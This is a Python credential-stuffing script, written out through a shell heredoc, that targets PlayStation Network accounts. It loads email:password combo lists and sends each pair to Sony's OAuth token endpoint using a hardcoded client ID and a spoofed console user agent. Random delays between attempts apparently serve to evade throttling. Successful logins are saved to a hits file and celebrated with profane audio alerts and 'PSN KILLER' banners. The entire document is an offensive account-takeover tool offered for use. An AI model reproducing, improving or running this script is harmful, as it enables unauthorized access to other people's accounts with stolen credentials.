cat > checker.py << 'EOF'
import requests, queue, threading, time, os, random, sys
from colorama import init, Fore, Back, Style
init(autoreset=True)

combo_file = "Name.txt"
hits_file  = "HITS.txt"
hits = checked = total = 0
start_time = time.time()
lock = threading.Lock()

with open(combo_file) as f: total = sum(1 for _ in f)

def scream():
    while True:
        os.system('termux-tts-speak "SCREAMING" 2>/dev/null || echo -e "\a\a\a\a\a\a\a\a\a\a"')
        time.sleep(2.5)

def fireworks():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    while True:
        print(random.choice(colors) + Style.BRIGHT + "█▓▒░ PSN KILLER ACTIVE ░▒▓█" + Style.RESET_ALL, end="\r")
        time.sleep(0.2)

def live():
    spins = "✸✹✺✻✼✽✾✿❀❁❂❃❄❅"
    i = 0
    while True:
        with lock:
            p = (checked/total)*100 if total else 0
            bar = "█"*int(p/2)+"░"*(50-int(p//2))
            speed = checked/(time.time()-start_time)if time.time()>start_time else 0
            c = random.choice([Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN])
            sys.stdout.write(f"\r{Style.BRIGHT}{spins[i%14]} {c}[{bar}] {p:6.2f}% │ "
                             f"{Fore.WHITE}Checked: {checked:,}/{total:,} │ "
                             f"{Fore.RED}Hits: {hits} │ "
                             f"{Fore.YELLOW}Speed: {speed:.2f}/s │ "
                             f"{Fore.MAGENTA}SCREAM MODE ON{Fore.RESET}")
            sys.stdout.flush()
            i += 1
        time.sleep(0.1)

threading.Thread(target=scream, daemon=True).start()
threading.Thread(target=fireworks, daemon=True).start()
threading.Thread(target=live, daemon=True).start()

print(f"\n{Fore.RED}{Back.YELLOW}{Style.BRIGHT}SCREAM MODE ENGAGED – {total:,} COMBOS LOADED!\n")

def check(e,p):
    global hits,checked
    try:
        r=requests.post("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/token",
              data={"grant_type":"password","username":e,"password":p,
                    "client_id":"b7cbf451-d150-4a19-8fbe-4a7e1a5ec8ea","scope":"psn:s2s"},
              headers={"User-Agent":"PlayStation 5"},timeout=15)
        if "access_token"in r.text:
            with lock:
                hits+=1
                os.system('termux-tts-speak "JACKPOT MOTHERFUCKER" 2>/dev/null || echo -e "\a"*20')
                print(f"\n{Back.RED}{Fore.YELLOW}{Style.BRIGHT}JACKPOT #{hits} → {e}:{p}{Style.RESET_ALL}")
                open(hits_file,"a").write(f"{e}:{p}\n")
    except:pass
    finally:
        with lock:checked+=1;time.sleep(random.uniform(0.38,0.91))

q=queue.Queue()
for line in open(combo_file):
    try:e,p=line.strip().split(":",1);q.put((e.strip(),p.strip()))
    except:pass

for _ in range(2):
    threading.Thread(target=lambda:[check(*q.get())for _ in iter(int,1)]or q.task_done(),daemon=True).start()

try:q.join()
except KeyboardInterrupt:print(f"\n{Fore.RED}STOPPED – HITS SAVED")
finally:print(f"\n{Back.GREEN}{Fore.BLACK}MISSION COMPLETE → {hits} HITS IN HITS.txt{Style.RESET_ALL}")
EOF
